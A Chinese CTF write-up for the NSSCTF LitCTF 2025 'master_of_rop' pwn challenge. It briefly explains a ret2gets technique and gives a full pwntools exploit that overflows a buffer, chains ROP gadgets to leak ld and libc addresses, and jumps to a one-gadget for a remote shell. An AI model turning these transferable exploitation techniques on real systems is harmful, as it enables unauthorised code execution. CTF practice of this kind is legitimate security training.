---
title: NSSCTF-LitCTF-2025-master_of_rop 题解
date: 2026-02-28 19:02:00
tags: 
    - ret2gets
    - pwn
    - NSSCTF
categories: NSSCTF 题解
---
### 题目

[题目链接](https://www.nssctf.cn/problem/6782)

### 攻击思路

没啥好说，就是 ret2gets

但是本地和远程的系统环境不同，导致 leak tls 后情况不一致

远程挺简单的， libc 与 tls 的偏移固定

但我的本地环境 leak 出的是与 ld 相关的地址，这就需要利用 ld 中的 gadget 再去 leak libc

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./pwn_patched')
else:
	io = remote('node4.anna.nssctf.cn', 21460)

rw_addr = 0x404400
gets_plt = 0x401080
puts_plt = 0x401060
again_addr = 0x4011B1

def attack():
	payload = b'A' * 32 + p64(rw_addr) + p64(gets_plt) + p64(gets_plt) + p64(puts_plt) + p64(again_addr)
	io.sendlineafter(b'LitCTF2025!\n', payload)
	io.sendline(b'A' * 8 + b'\x00' * 6)
	io.sendline(b'A' * 4)
	io.recv(8)
	anon_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x740
	log.info(f'anon_base = {hex(anon_base)}')
	ld_base = anon_base + 0xc000
	log.info(f'ld_base = {hex(ld_base)}')
	pop_rdi_pop_rbp_ret = ld_base + 0x23dcc
	payload = b'A' * 32 + p64(rw_addr) + p64(pop_rdi_pop_rbp_ret) + p64(anon_base + 0x6c0) + p64(rw_addr) + p64(puts_plt) + p64(again_addr)
	io.sendlineafter(b'LitCTF2025!\n', payload)
	libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x20b680
	log.info(f'libc_base = {hex(libc_base)}')
	pop_rbx_ret = libc_base + 0x586e4
	pop_r12_ret = libc_base + 0x110951
	onegadget = libc_base + 0xef4ce
	payload = b'A' * 32 + p64(rw_addr) + p64(pop_rbx_ret) + p64(0) + p64(pop_r12_ret) + p64(0) + p64(onegadget)
	io.sendlineafter(b'LitCTF2025!\n', payload)
	io.interactive()

attack()
```